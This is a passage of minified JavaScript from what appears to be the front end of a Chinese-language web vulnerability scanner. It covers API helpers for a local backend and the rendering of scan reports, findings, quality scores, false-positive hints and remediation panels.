<span style="font-size:12px;color:var(--text-secondary)">'+S(v)+"</span>")}else n='<span style="display:inline-block;background:#c75450;color:#fff;padding:2px 8px;border-radius:2px;font-size:11px;font-weight:700">'+S(d)+"</span>"}else r==="missing_flags"?n=(Array.isArray(a)?a:[a]).map(function(f){return'<code style="background:rgba(240,167,50,0.1);color:#f0a732;padding:2px 8px;border-radius:2px;font-size:12px">'+S(f)+"</code>"}).join(" "):r==="status"||r==="days_left"?n='<span style="font-weight:600;color:var(--text-primary);font-size:12px">'+S(a)+"</span>":r==="snippet"?n='<code style="background:#1e293b;color:#e2e8f0;padding:6px 8px;border-radius:2px;font-size:11px;word-break:break-all;display:block;white-space:pre-wrap;max-height:160px;overflow:auto">'+S(a)+"</code>":n='<span style="font-size:12px;color:var(--text)">'+S(a)+"</span>";return'<div style="margin-bottom:8px"><span style="display:inline-block;min-width:80px;color:var(--text-secondary);font-size:12px;font-weight:600">'+o+"</span> "+n+"</div>"}).join("")+"</div>"}let li=[],It=0;const rr=3,sr=2500;function L(e,i){li.push({msg:e,type:i}),Vi()}function Vi(){if(It>=rr||li.length===0)return;let e=li.shift();It++;let i=document.getElementById("toast-container");if(!i){It--;return}let t=document.createElement("div");t.className="toast";let s="ℹ️";e.type==="error"?s="[错误]":e.type==="success"?s="[成功]":e.type==="warn"&&(s="[警告]");let r=document.createElement("span");r.textContent=s+" ",r.style.marginRight="6px",t.appendChild(r),t.appendChild(document.createTextNode(e.msg)),e.type==="error"?t.classList.add("error"):e.type==="success"&&t.classList.add("success"),i.appendChild(t),requestAnimationFrame(function(){requestAnimationFrame(function(){t.classList.add("show")})}),setTimeout(function(){t.classList.add("hiding"),t.classList.remove("show"),setTimeout(function(){t.parentNode&&t.parentNode.removeChild(t),It--,Vi()},300)},sr)}function Gi(e){return e?String(e).replace(/\/+$/,""):""}function Ji(){const e=[];typeof window<"u"&&window.__CONFIG__&&window.__CONFIG__.api_base_url&&e.push(Gi(window.__CONFIG__.api_base_url));const i=typeof window<"u"&&(window.location.protocol==="tauri:"||window.location.protocol==="asset:"||window.location.hostname==="tauri.localhost");return typeof window<"u"&&(window.location.protocol==="http:"||window.location.protocol==="https:")&&!i&&e.push(""),e.push("http://127.0.0.1:8011"),[...new Set(e)]}const Oi=Ji()[0]||"";async function Ve(e){const i=e.headers&&e.headers.get("content-type")||"",s=(await e.text()).trim();if(/^<!doctype\s+html\b/i.test(s)||/^<html[\s>]/i.test(s)||!i.toLowerCase().includes("json")&&s.startsWith("<"))throw new Error("本地后端没有正确响应，请确认安装包内本地服务已启动后重试");if(!s)return{};try{return JSON.parse(s)}catch{throw new Error("本地后端返回了无效数据，请重启安装包后重试")}}function or(e){return new Promise(function(i){setTimeout(i,e)})}function Ki(){try{return localStorage.getItem("vs_token")}catch{return null}}function ar(){try{localStorage.removeItem("vs_token")}catch{}}function ve(){return!!Ki()}function Yi(e){try{localStorage.setItem("vs_role",e||"member")}catch{}}function lr(){const e=Ki(),i={"Content-Type":"application/json"};return e&&(i.Authorization="Bearer "+e),i}async function ce(e,i={}){i.headers=Object.assign({},lr(),i.headers||{});const t=!!i.skipAuthExpiry,s=Ji(),r=[];for(const n of s){const d=Gi(n),f=d?d+e:e;r.push(f),e.startsWith("/api/")&&!e.startsWith("/api/v1/")&&d&&r.push(d+"/api/v1"+e.slice(4))}let o=null,a=null;for(const n of r){let d=0;for(;d<2;)try{const f=await fetch(n,i);if(o=f,f.status===404&&r.length>1)break;if(f.status===401&&!t){ar();try{localStorage.removeItem("vs_username")}catch{}throw new Error("登录状态已过期，请重新登录后再继续使用扫描功能")}return f}catch(f){if(a=f,d+=1,d<2){await or(250);continue}break}}if(o)return o;throw a&&a.message?new Error("无法连接扫描服务，请确认本地后端已启动"):new Error("无法连接扫描服务，请确认本地后端已启动")}async function Xe(e,i){const t=await ce(e,{skipAuthExpiry:!0,method:"POST",body:JSON.stringify(i)}),s=await Ve(t);return s&&typeof s=="object"&&(s._status=t.status,s._statusText=t.statusText),s}async function je(e){const i=await ce(e),t=await Ve(i);return t&&typeof t=="object"&&(t._status=i.status,t._statusText=i.statusText),t}async function dr(e){const i=await ce(e,{method:"DELETE"}),t=await Ve(i);return t&&typeof t=="object"&&(t._status=i.status,t._statusText=i.statusText),t}async function cr(e,i){const t=await ce(e,{method:"PATCH",body:JSON.stringify(i)}),s=await Ve(t);return s&&typeof s=="object"&&(s._status=t.status,s._statusText=t.statusText),s}function pr(){return je("/api/config")}function ur(){return je("/api/me/credits")}function fr(e=20,i=0){return je("/api/usage?limit="+encodeURIComponent(e)+"&offset="+encodeURIComponent(i))}function gr(e){return Xe("/api/scan",e)}function hr(e){return Xe("/api/fix-tickets",e)}function vr(e){return je("/api/fix-tickets")}function kt(e,i){return cr("/api/fix-tickets/"+e,i)}function Qi(e){return dr("/api/fix-tickets/"+e)}function mr(e,i="markdown"){return ce("/api/fix-tickets/"+e+"/export?format="+encodeURIComponent(i),{method:"GET"})}function yr(){return je("/api/fix-tickets/meta/collaborators")}function br(e){return ce("/api/report/src-export",{method:"POST",body:JSON.stringify(e)})}function xr(e){return Xe("/api/finding/verify-reproduce",e)}function wr(e){return Xe("/api/finding/feedback",e)}function kr(){return je("/api/billing/plans")}function _r(e){return Xe("/api/billing/order",e)}function Sr(e){return je("/api/billing/order/"+encodeURIComponent(e))}function Er(e=50,i=0){return je("/api/billing/recharges?limit="+encodeURIComponent(e)+"&offset="+encodeURIComponent(i))}const zr=(...e)=>typeof window.navigateTo=="function"&&window.navigateTo(...e),Ut={critical:0,high:1,medium:2,low:3,info:4},en={critical:"严重",high:"高危",medium:"中危",low:"低危",info:"信息"},tn={critical:"high",high:"high",medium:"medium",low:"low",info:"info"},nn={sqli:"SQL 注入",xss:"跨站脚本",csrf:"跨站请求伪造",ssti:"模板注入",open_redirect:"开放重定向",cmdi:"命令注入",traversal:"路径遍历",deserialization:"不安全反序列化",ssrf:"服务端请求伪造",xxe:"XML 外部实体注入",idor:"不安全直接对象引用",info_leak:"信息泄露",auth_weakness:"认证薄弱",bruteforce_protection:"防爆破不足",unauthorized_access:"未授权访问",api_auth_missing:"API 鉴权缺失",sensitive_config_exposure:"敏感配置泄露",clickjacking:"点击劫持",file_upload:"不安全文件上传",logic_bypass:"业务逻辑绕过",sri_missing:"SRI 完整性缺失",supply_chain_exposure:"供应链风险"},Cr=[{label:"公开暴露面",types:new Set(["discovery_exposure","well_known_exposure","exposed_endpoint","backup_exposure","sensitive_path","sensitive_config_exposure","directory_listing","server_exposure","info_leak","passive_exposure","api_surface_exposure"]),keywords:["敏感路径","敏感文件","备份","目录","信息泄露","source map","调试","公开","well-known","api 文档","swagger","openapi","metrics","actuator","console","phpinfo"]},{label:"配置与响应头",types:new Set(["header_missing","cookie_security","cors_misconfig","csp_weakness","trace_method","ssl"]),keywords:["CSP","Cookie","CORS","HSTS","X-Frame-Options","TRACE","TLS","HTTPS"]},{label:"认证与授权",types:new Set(["csrf","auth_weakness","bruteforce_protection","api_auth_missing","broken_access_control","idor","unauthorized_access","logic_bypass","clickjacking"]),keywords:["认证","授权","登录","越权","权限","爆破","CSRF","IDOR","劫持"]},{label:"注入与输入验证",types:new Set(["sqli","ssti","reflected_xss","xxe","cmdi","traversal","ssrf","open_redirect","deserialization"]),keywords:["注入","XSS","XXE","命令","遍历","SSRF","重定向","反序列化"]},{label:"组件与供应链",types:new Set(["outdated_component","supply_chain_exposure"]),keywords:["组件","框架","版本","CVE","供应链","第三方资源","明文资源"]}],Ri={公开暴露面:0,配置与响应头:1,认证与授权:2,注入与输入验证:3,组件与供应链:4,其他风险:5};let Pe=[],qt=0,lt="generic",Re=null,hi="",Ye=!1,rn=0,Ht={total:0,fp_count:0};function Tr(e){if(!e||!Array.isArray(e.findings)||e.findings.length===0)return!1;const i=e.findings[0];return i&&typeof i=="object"&&"id"in i&&"severity"in i&&"evidence"in i}function sn(e){const i=String((e==null?void 0:e.type)||(e==null?void 0:e.vulnerability_type)||"").toLowerCase(),t=[e==null?void 0:e.name,e==null?void 0:e.title,e==null?void 0:e.summary,e==null?void 0:e.description,i].filter(Boolean).join(" ").toLowerCase();for(const s of Cr)if(s.types.has(i)||s.keywords.some(r=>t.includes(r.toLowerCase())))return s.label;return"其他风险"}function on(e){const i=new Map;return(e||[]).forEach(t=>{const s=sn(t);i.has(s)||i.set(s,{label:s,items:[],counts:{critical:0,high:0,medium:0,low:0,info:0}});const r=i.get(s);r.items.push(t);const o=String((t==null?void 0:t.severity)||"info").toLowerCase();r.counts[Object.prototype.hasOwnProperty.call(r.counts,o)?o:"info"]+=1}),Array.from(i.values()).sort((t,s)=>{const r=["critical","high","medium","low","info"].find(n=>(t.counts[n]||0)>0)||"info",o=["critical","high","medium","low","info"].find(n=>(s.counts[n]||0)>0)||"info",a=(Ut[r]??99)-(Ut[o]??99);return a!==0?a:s.items.length!==t.items.length?s.items.length-t.items.length:(Ri[t.label]??99)-(Ri[s.label]??99)})}function Ir(e){const i=on(e);if(i.length===0)return"";const t=i.slice(0,4).map(s=>{const r=s.counts,o=["critical","high","medium","low","info"].find(n=>(r[n]||0)>0)||"info";return`
      <div class="${o==="critical"||o==="high"?"surface-card critical":o==="medium"?"surface-card medium":"surface-card low"}">
        <div class="surface-card-head">
          <span class="surface-card-title">${S(s.label)}</span>
          <span class="surface-card-badge">${S(o)}</span>
        </div>
        <div class="surface-card-count">${s.items.length}</div>
        <div class="surface-card-detail">严重 ${r.critical} / 高危 ${r.high} / 中危 ${r.medium} / 低危 ${r.low} / 信息 ${r.info}</div>
      </div>
    `}).join("");return`
    <div class="src-surface-overview fade-in-up">
      <div class="src-surface-overview-head">
        <div>
          <div class="src-surface-overview-title">风险面总览</div>
          <div class="src-surface-overview-subtitle">建议先查看风险面分布，再进入问题明细与证据详情。</div>
        </div>
        <div class="src-surface-overview-pill">${i.length} 个风险面</div>
      </div>
      <div class="src-surface-grid">${t}</div>
    </div>
  `}function Ar(e,i){const t=on(e);if(t.length===0)return{managementSummary:"当前未发现需要升级处理的风险面，可作为本次版本的基线记录。",priorities:["继续保持现有安全基线，并在后续版本变更后复扫确认。","将当前结果与修复记录一并留档，便于后续验收比对。","对新增页面、接口和第三方资源保持持续监控。"]};const s=t.slice(0,3).map(d=>{const f=d.counts,v=["critical","high","medium","low","info"].find(c=>(f[c]||0)>0)||"info";return`${d.label}${d.items.length}项，最高${v}`}),r=i.fp_count||0,o="当前主要风险面集中在 "+s.join("；")+"。结果已按可信度和验证状态分层，可直接用于客户沟通与整改排期。",n=[(i.critical||0)+(i.high||0)>0?"先关闭严重和高危项，优先收口已经暴露到公网边界的入口与配置缺口。":"先处理中危项和集中风险面，避免问题在后续版本中继续扩散。","再对已验证项完成修复、回归和留档，确保这次整改可以复测、可以交付。",r>0?"最后安排建议复核项的人工确认，区分真实问题与防护页、软 404 等干扰信号。":"最后把本次结果沉淀为安全基线，作为后续版本对比和验收依据。"];return{managementSummary:o,priorities:n}}function an(e){Pe=Or(e.findings||[]),qt=0,lt="generic",Ye=!1,Re=e.scan_id||null,hi=e.url||"",rn=typeof e.score=="number"?e.score:parseInt(e.score,10)||0,Ht=e.summary||{critical:0,high:0,medium:0,low:0,info:0,total:0,fp_count:0};const i=typeof e.score=="number"?e.score:parseInt(e.score,10)||0,t=e.summary||{critical:0,high:0,medium:0,low:0,info:0,total:0},s=e.risk_level||"未知",r=e.url||"",o=document.getElementById("result-content")||document.getElementById("result-container");if(!o){setTimeout(()=>an(e),0);return}let a="";a+=Rr(i,s,t,r,e),e.quality&&e.quality.overall_score!==void 0&&(a+=Br(e.quality,e.dedup_stats)),a+=Ir(Pe);const n=Pe.length>0?Pe[0]:null;a+='<div class="src-result-layout">',a+='<div class="src-result-sidebar">'+Mr(Pe,qt)+"</div>",a+='<div class="src-result-detail" id="src-detail-panel">'+vi(n)+"</div>",a+="</div>",o.innerHTML=a,jr(),Lr()}function Br(e,i){const t=e.overall_score||0,s=t>=80?"#73c990":t>=60?"#f0a732":"#c75450",r=e.coverage_score||0,o=e.reliability_score||0,a=e.depth_score||0,n=e.recommendations||[],d=e.coverage_breakdown||{},f=e.reliability_breakdown||{},v=d.types_detected||[],c=i||{},p=c.original_count!==void 0?`<div class="src-quality-dedup">
         <span class="src-quality-label">去重统计</span>
         <span class="src-quality-stat">原始 ${c.original_count||0}</span>
         <span class="src-quality-arrow">→</span>
         <span class="src-quality-stat highlight">${c.deduplicated_count||0}</span>
         ${c.duplicate_count>0?`<span class="src-quality-tag">移除重复 ${c.duplicate_count}</span>`:""}
         ${c.correlation_groups>0?`<span class="src-quality-tag">关联组 ${c.correlation_groups}</span>`:""}
       </div>`:"",h=f.fp_rate!==void 0?(f.fp_rate*100).toFixed(0)+"%":"-",m=f.high_confidence_rate!==void 0?(f.high_confidence_rate*100).toFixed(0)+"%":"-";return`
    <div class="src-quality-panel" id="src-quality-panel">
      <div class="src-quality-header" id="src-quality-toggle">
        <div class="src-quality-score-wrap">
          <div class="src-quality-ring" style="border-color:${s}">
            <span style="color:${s};font-size:22px;font-weight:700">${t}</span>
          </div>
          <span class="src-quality-title">扫描可信度</span>
        </div>
        <div class="src-quality-bars">
          <div class="src-quality-bar-row">
            <span class="src-quality-bar-label">覆盖度</span>
            <div class="src-quality-bar"><div class="src-quality-bar-fill" style="width:${r}%;background:${r>=80?"#73c990":r>=60?"#f0a732":"#c75450"}"></div></div>
            <span class="src-quality-bar-val">${r}</span>
          </div>
          <div class="src-quality-bar-row">
            <span class="src-quality-bar-label">可靠性</span>
            <div class="src-quality-bar"><div class="src-quality-bar-fill" style="width:${o}%;background:${o>=80?"#73c990":o>=60?"#f0a732":"#c75450"}"></div></div>
            <span class="src-quality-bar-val">${o}</span>
          </div>
          <div class="src-quality-bar-row">
            <span class="src-quality-bar-label">深度</span>
            <div class="src-quality-bar"><div class="src-quality-bar-fill" style="width:${a}%;background:${a>=80?"#73c990":a>=60?"#f0a732":"#c75450"}"></div></div>
            <span class="src-quality-bar-val">${a}</span>
          </div>
        </div>
        <button class="src-quality-expand" id="src-quality-expand-btn">展开</button>
      </div>
      <div class="src-quality-detail" id="src-quality-detail" style="display:none">
        <div class="src-quality-grid">
          <div class="src-quality-section">
            <div class="src-quality-section-title">覆盖说明</div>
            <div class="src-quality-section-body">
              <div class="src-quality-kv"><span>检测漏洞类型</span><code>${v.length} 种</code></div>
              <div class="src-quality-kv"><span>类型列表</span><code>${S(v.join(", ")||"-")}</code></div>
              <div class="src-quality-kv"><span>总发现数</span><code>${d.total_findings||0}</code></div>
            </div>
          </div>
          <div class="src-quality-section">
            <div class="src-quality-section-title">可信度与复核</div>
            <div class="src-quality-section-body">
              <div class="src-quality-kv"><span>误报率</span><code>${h}</code></div>
              <div class="src-quality-kv"><span>高置信度比例</span><code>${m}</code></div>
              <div class="src-quality-kv"><span>建议复核数</span><code>${f.fp_count||0}</code></div>
              <div class="src-quality-kv"><span>高置信度数</span><code>${f.high_confidence_count||0}</code></div>
              <div class="src-quality-kv"><span>确认数</span><code>${d.confirmed_count||0}</code></div>
            </div>
          </div>
        </div>
        ${p}
        ${n.length>0?`
          <div class="src-quality-recommendations">
            <div class="src-quality-section-title">建议</div>
            <ul class="src-quality-rec-list">
              ${n.map(g=>`<li>${S(g)}</li>`).join("")}
            </ul>
          </div>
        `:""}
      </div>
    </div>
  `}function Lr(){const e=document.getElementById("src-quality-toggle"),i=document.getElementById("src-quality-detail"),t=document.getElementById("src-quality-expand-btn");!e||!i||!t||(e.addEventListener("click",function(s){if(s.target===t)return;const r=i.style.display!=="none";i.style.display=r?"none":"block",t.textContent=r?"查看明细":"收起"}),t.addEventListener("click",function(s){s.stopPropagation();const r=i.style.display!=="none";i.style.display=r?"none":"block",t.textContent=r?"查看明细":"收起明细"}))}function Or(e){return e.slice().sort((i,t)=>{const s=Mi(i.verification_status),r=Mi(t.verification_status);if(s!==r)return s-r;const o=i.is_likely_fp?1:0,a=t.is_likely_fp?1:0;if(o!==a)return o-a;const n=Ut[(i.severity||"").toLowerCase()]??99,d=Ut[(t.severity||"").toLowerCase()]??99;return n!==d?n-d:(t.severity_score||0)-(i.severity_score||0)})}function Mi(e){const i=String(e||"").toLowerCase();return i==="confirmed"?0:i==="probable"?1:i==="suspected"?2:3}function ln(e){const i=(e||[]).join(" ").toLowerCase(),t=[];return/cloudflare|akamai|incapsula|sucuri|cdn|waf|challenge|verify you are human|security check|bot detection/.test(i)&&t.push("CDN / WAF / 挑战页"),/login|log in|sign in|authentication|认证墙|password|csrf token/.test(i)&&t.push("登录墙 / 认证页"),/soft 404|page not found|not found|does not exist|模板错误页|通用错误页|404/.test(i)&&t.push("软 404 / 模板错误页"),t.length===0&&e&&e.length>0&&t.push("建议复核"),t}function Rr(e,i,t,s,r){const o=jt(e);Nt(e);const a=Xi(i),n=r.duration_ms?`<span class="meta-item">耗时 ${r.duration_ms}ms</span>`:"",d=r.scan_id?`<span class="meta-item">扫描 #${r.scan_id}</span>`:"",f=r.report_share_id?`<span class="meta-item">报告 ${S(r.report_share_id)}</span>`:"",v=r.scan_id&&ve()?'<button class="src-export-btn" id="src-export-markdown" title="导出 SRC 格式 Markdown 报告">导出 SRC 报告</button>':"",p=(r.quality||{}).overall_score||0,h=p>0?`<span class="meta-item" style="color:${p>=80?"#73c990":p>=60?"#f0a732":"#c75450"}">质量 ${p}分</span>`:"",m=r.verification_stats||{},g=m.enabled?`<span class="meta-item verification-badge">
        <span class="v-confirmed" title="已验证">${m.confirmed||0}</span>
        <span class="v-probable" title="已验证/可信">${m.probable||0}</span>
        <span class="v-suspected" title="待人工复核">${m.suspected||0}</span>
       </span>`:"",y=t.total||0,b=t.fp_count||0,k=Math.max(0,y-b),x=t.critical||0,C=t.high||0,z=t.medium||0,P=t.low||0,R=t.info||0,j=x+C>0?"优先关闭已确认高危暴露面，再安排复测确认修复是否生效。":z>0?"先处理中危项，再复扫验证修复是否生效。":"当前结果偏健康，可作为客户基线留存并持续监控。",M="本次检测共输出 "+y+" 项结果，其中 "+k+" 项建议优先处置，"+b+" 项建议复核。",D="本报告适用于授权范围内的客户交付、复测留档与整改跟踪，已优先突出高风险、已验证项与待复核项，便于直接进入处置流程。",Y=r.scan_id?'<div class="src-report-action-hint src-report-action-hint-alert">建议优先处置已验证项，再安排人工复核建议复核项。</div>':"",E=Ar(Pe,t),H=E.priorities.map((l,A)=>`<div class="src-report-priority-item"><span class="src-report-priority-index">${A+1}</span><span>${S(l)}</span></div>`).join("");return`
    <div class="src-report-header fade-in-up">
      <div class="src-score-wrap">
        <div class="src-score-ring" style="background:${o};color:#fff">
          <div class="src-score-value">${e}</div>
          <div class="src-score-label">安全评分</div>
        </div>
      </div>
      <div class="src-report-meta">
        <div class="src-report-title-row">
          <span class="risk-badge ${a}">${S(i)}</span>
          <span class="src-report-url">${S(s)}</span>
        </div>
        <div class="src-report-stats">
          <div class="src-stat critical"><div class="num">${x}</div><div class="label">严重</div></div>
          <div class="src-stat high"><div class="num">${C}</div><div class="label">高危</div></div>
          <div class="src-stat medium"><div class="num">${z}</div><div class="label">中危</div></div>
          <div class="src-stat low"><div class="num">${P}</div><div class="label">低危</div></div>
          <div class="src-stat info"><div class="num">${R}</div><div class="label">信息</div></div>
          <div class="src-stat total"><div class="num">${y}</div><div class="label">总计</div></div>
          <div class="src-stat" style="background:rgba(115,201,144,0.08)"><div class="num" style="color:#73c990">${k}</div><div class="label">待处理</div></div>
        </div>
        <div class="src-report-submeta">
          ${d}${n}${f}${h}${g}
          <span class="meta-item">发现于 ${Gt(r.discovered_at||new Date().toISOString())}</span>
        </div>
        <div class="src-report-actions">
          ${v}
          <button class="src-export-btn" id="src-copy-summary" title="复制当前报告摘要">复制摘要</button>
        </div>
        <div class="src-report-summary">${S(M)}</div>
        <div class="src-report-intro">${S(D)}</div>
        <div class="src-report-exec-summary">
          <div class="src-report-exec-title">执行摘要</div>
          <div class="src-report-exec-text">结果已按风险等级、验证状态、证据完整度和可信度分层整理，建议复核项已单独标出，适合直接用于客户沟通、整改排期与验收留档。</div>
        </div>
        <div class="src-report-capability">
          <div class="src-report-capability-title">管理层关注</div>
          <div class="src-report-capability-text">${S(E.managementSummary)}</div>
        </div>
        <div class="src-report-capability">
          <div class="src-report-capability-title">检测摘要</div>
          <div class="src-report-capability-grid">
            <div class="src-report-capability-item"><span>已验证</span><strong>${m.confirmed||0}</strong></div>
            <div class="src-report-capability-item"><span>建议复核</span><strong>${b}</strong></div>
            <div class="src-report-capability-item"><span>当前重点</span><strong>控制误报 / 保证可交付</strong></div>
          </div>
          <div class="src-report-capability-text">当前更适合做基础安全检测、证据展示、复测验证和整改跟踪；遇到登录墙、WAF/CDN、软 404 等场景会自动降权提示，优先保证结果可信与可交付。</div>
        </div>
        <div class="src-report-next-step">
          <div class="src-report-next-step-title">修复优先级路线</div>
          <div class="src-report-next-step-text">${S(j)}${b>0?" 当前已识别 "+b+" 项建议复核结果，默认优先显示可信项，便于快速进入处置流程。":""}</div>
          <div class="src-report-priority-list">${H}</div>
          <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px">
            <button class="src-filter-btn" onclick="navigateTo('tickets')">工单</button>
            <button class="src-filter-btn" onclick="navigateTo('fixer')">修复</button>
          </div>
          ${Y}
        </div>
      </div>
    </div>
  `}function Mr(e,i){let t=Ye?e.filter(o=>!o.is_likely_fp):e,s=e.length-t.length,r='<div class="src-list-header">结果列表 <span class="src-list-count">'+t.length+"</span>";return r+='<button class="src-filter-btn" data-action="toggle-fp-filter" title="切换建议复核项显示">'+(Ye?"显示全部":"优先可信项")+"</button>",s>0&&(r+='<span class="src-filter-note">已隐藏 '+s+" 项</span>"),r+="</div>",r+='<div class="src-list-items">',e.length===0?r+='<div class="src-empty">'+(Ye?"筛选下没有结果":"暂无结果")+"</div>":t.forEach((o,a)=>{const n=(o.severity||"info").toLowerCase(),d=tn[n]||"info",f=a===i?"active":"",v=o.parameter?`<code class="src-list-param">${S(o.parameter)}</code>`:"",c=String(o.type||"").toLowerCase(),p=nn[c]||(o.type?String(o.type).toUpperCase():""),h=p?`<span class="src-list-type">${S(p)}</span>`:"",m=`<span class="src-list-surface">${S(sn(o))}</span>`,g=o.url?new URL(o.url,window.location.href).hostname:"",y=o.url?new URL(o.url,window.location.href).pathname:"",b=ln(Array.isArray(o.fp_reasons)?o.fp_reasons:[]),k=b.length>0?b[0]:"待人工复核",x=o.is_likely_fp?`<span class="src-list-fp-tag src-list-fp-tag-alert" title="建议复核">${S(k)}</span>`:"",C=o.correlation_group?`<span class="src-list-corr" title="关联组 ${xe(o.correlation_group)}（${o.correlation_size||0} 个相关）">${S(o.correlation_group)}</span>`:"",z=o.merged_count>1?`<span class="src-list-merged" title="合并了 ${o.merged_count} 个重复项">×${o.merged_count}</span>`:"",P=o.verification_status,R=P==="confirmed"?'<span class="src-list-v confirmed" title="已验证">✓ 已验证</span>':P==="probable"?'<span class="src-list-v probable" title="可复现">? 可复现</span>':P==="suspected"?'<span class="src-list-v suspected" title="待人工复核">! 待人工复核</span>':"",j=o.user_feedback?o.user_feedback.is_false_positive?'<span class="src-list-fb fp" title="已标记误报">误报</span>':'<span class="src-list-fb confirmed" title="已确认">确认</span>':"",M=String(o.adjusted_confidence||o.confidence||"medium"),D=M==="high"?"高可信":M==="medium"?"中可信":M==="low"?"低可信":M;r+=`
        <div class="src-list-item ${f} ${d}" data-index="${a}">
          <div class="src-list-row top">
            <span class="src-sev-badge ${d}">${en[n]}</span>
            <span class="src-list-title" title="${xe(o.title||"")}">${S(o.title||"未命名漏洞")}</span>
            ${R}${j}${x}${z}
          </div>
          <div class="src-list-row meta">
            ${h}
            ${m}
            ${v}
            <span class="src-list-host" title="${xe(o.url||"")}">${S(g)}${S(y)}</span>
            <span class="src-list-confidence ${S(M)}">${S(D)}</span>
            ${C}
          </div>
        </div>
      `}),r+="</div>",r}function vi(e,i){if(!e)return'<div class="src-empty-detail">从左侧选择一项查看证据和建议</div>';const t=(e.severity||"info").toLowerCase(),s=tn[t]||"info",r=en[t]||"信息",o=e.evidence||{},a=e.location_detail||{},n={open:"待处理",confirmed:"已确认",false_positive:"误报",fixed:"已修复"},d=e.status||"open",f=Array.isArray(e.fp_reasons)?e.fp_reasons:[],v=ln(f),c=e.is_likely_fp?`<div class="src-fp-banner">
        <div class="src-fp-banner-title">疑似防护页 / 误报，建议优先复核</div>
        <div class="src-fp-banner-desc">${S(v.length>0?v.join(" · "):"页面更像 CDN/WAF 拦截、登录墙、软 404 或挑战页，而不是可直接利用的漏洞。")}</div>
      </div>`:"";let p='<div class="src-detail-card fade-in-up">';if(p+=`<div class="src-detail-header">
    <div class="src-detail-title-row">
      <span class="src-detail-severity ${s}">${r}</span>
      <h2 class="src-detail-title">${S(e.title||"未命名漏洞")}</h2>
      <span class="src-detail-status ${d}">${n[d]||d}</span>
    </div>
    <div class="src-detail-subtitle">
      <code class="src-detail-id">${S(e.id||"")}</code>
      <span class="src-detail-type">${S(nn[String(e.type||"").toLowerCase()]||String(e.type||"").toUpperCase())}</span>
      ${e.cwe_id?`<span class="src-detail-cwe" title="Common Weakness Enumeration">${S(e.cwe_id)}</span>`:""}
      ${e.owasp_category?`<span class="src-detail-owasp">${S(e.owasp_category)}</span>`:""}
      ${e.cvss_score?`<span class="src-detail-cvss" title="${S(e.cvss_vector||"")}">CVSS ${e.cvss_score}</span>`:""}
      ${e.severity_score?`<span class="src-detail-score">评分 ${e.severity_score}/10</span>`:""}
      <span class="src-detail-confidence">置信度 ${S((e.adjusted_confidence||e.confidence||"medium").toString())}</span>
      ${e.verification_status?`<span class="src-detail-verify-badge ${e.verification_status}">${e.verification_status==="confirmed"?"已验证":e.verification_status==="probable"?"可复现":"待人工复核"}</span>`:""}
      ${e.is_likely_fp?'<span class="src-detail-fp-badge src-detail-fp-badge-alert">疑似防护页</span>':""}
      ${e.user_feedback?e.user_feedback.is_false_positive?'<span class="src-detail-fp-badge" title="您误报">已标记误报</span>':'<span class="src-detail-verify-badge verified" title="您已确认">客户确认</span>':""}
    </div>
    ${c}
  </div>`,p+=`<div class="src-detail-tabs">
    <button class="src-detail-tab active" data-tab="overview">概览</button>
    <button class="src-detail-tab" data-tab="evidence">请求 / 响应</button>
    <button class="src-detail-tab" data-tab="fix">修复</button>
  </div>`,p+='<div class="src-detail-panel active" data-panel="overview">',e.fp_score!==void 0||e.verification_score!==void 0||e.fp_reasons&&e.fp_reasons.length>0){if(p+=`<div class="src-detail-section">
      <div class="src-section-title">可信度与证据等级</div>
      <div class="src-section-body">`,e.fp_score!==void 0){const b=(e.fp_score*100).toFixed(0),k=e.fp_score>=.5?"#c75450":e.fp_score>=.3?"#f0a732":"#73c990";p+=`<div class="src-kv"><span class="src-k">误报概率</span><span class="src-v" style="color:${k}">${b}%</span></div>`}if(e.verification_score!==void 0){const b=e.verification_score>=80?"#73c990":e.verification_score>=60?"#f0a732":"#c75450";p+=`<div class="src-kv"><span class="src-k">验证得分</span><span class="src-v" style="color:${b}">${e.verification_score}/100</span></div>`}e.verification_techniques&&e.verification_techniques.length>0&&(p+=`<div class="src-kv"><span class="src-k">验证技术</span><span class="src-v">${S(e.verification_techniques.join(", "))}</span></div>`),e.fp_reasons&&e.fp_reasons.length>0&&(p+=`<div class="src-fp-reasons"><ul>${e.fp_reasons.map(b=>`<li>${S(b)}</li>`).join("")}</ul></div>`),p+="</div></div>"}p+=`<div class="src-detail-section">
    <div class="src-section-title">漏洞描述</div>
    <div class="src-section-body">${S(e.description||"暂无描述")}</div>
  </div>`,p+=`<div class="src-detail-section">
    <div class="src-section-title">实际影响</div>
    <div class="src-section-body">${S(e.impact||"暂无影响说明")}</div>
  </div>`,p+=`<div class="src-detail-section">
    <div class="src-section-title">精准位置</div>
    <div class="src-section-body">
      <div class="src-kv"><span class="src-k">URL</span><code class="src-v">${S(a.url||e.url||"")}</code></div>
      ${a.method?`<div class="src-kv"><span class="src-k">方法</span><code class="src-v">${S(a.method)}</code></div>`:""}
      ${a.parameter||e.parameter?`<div class="src-kv"><span class="src-k">参数</span><code class="src-v">${S(a.parameter||e.parameter)}</code></div>`:""}
      ${a.parameter_type?`<div class="src-kv"><span class="src-k">参数类型</span><code class="src-v">${S(a.parameter_type)}</code></div>`:""}
      ${a.code_location?`<div class="src-kv"><span class="src-k">代码位置</span><code class="src-v">${S(a.code_location)}</code></div>`:""}
      ${a.snippet?`<div class="src-kv"><span class="src-k">上下文</span><span class="src-v">${S(a.snippet)}</span></div>`:""}
      ${!a.url&&e.location?`<div class="src-kv"><span class="src-k">位置</span><span class="src-v">${S(e.location)}</span></div>`:""}
    </div>
  </div>`,Array.isArray(e.reproduce_steps)&&e.reproduce_steps.length>0&&(p+=`<div class="src-detail-section">
      <div class="src-section-title">复测步骤</div>
      <ol class="src-repro-steps">`,e.reproduce_steps.forEach(b=>{p+=`<li>${S(b)}</li>`}),p+="</ol></div>"),p+="</div>",p+='<div class="src-detail-panel" data-panel="evidence">',p+=Pr(o,e),p+="</div>",p+='<div class="src-detail-panel" data-panel="fix">';const h=e.fix_suggestion||"暂无建议",m=h.split(/\n+/).map(b=>b.trim()).filter(Boolean),g=m[0]||"暂无建议",y=m.slice(1,4);return p+=`<div class="src-detail-section">
    <div class="src-section-title">修复结论</div>
    <div class="src-section-body">
      <div style="font-weight:700;margin-bottom:6px;color:var(--text-primary)">${S(g)}</div>
      <div style="font-size:12px;color:var(--text-secondary);line-height:1.7">${S(h)}</div>
    </div>
  </div>`,y.length>0&&(p+=`<div class="src-detail-section">
      <div class="src-section-title">实施步骤</div>
